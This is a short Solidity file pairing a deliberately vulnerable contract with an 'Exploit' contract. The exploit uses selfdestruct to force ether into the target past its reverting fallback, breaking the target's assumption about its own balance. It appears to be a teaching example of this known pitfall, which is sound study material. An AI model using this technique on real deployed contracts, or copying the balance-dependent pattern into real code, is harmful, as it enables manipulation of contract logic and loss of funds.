pragma solidity ^0.4.18;

contract Vulnerable {
    function () payable {
        revert();
    }

    function somethingBad() returns (uint) {
        require(this.balance > 0);
        // something bad
        return this.balance;
    }
}

contract Exploit {
    constructor (address target) payable {
        selfdestruct(target);
    }
}
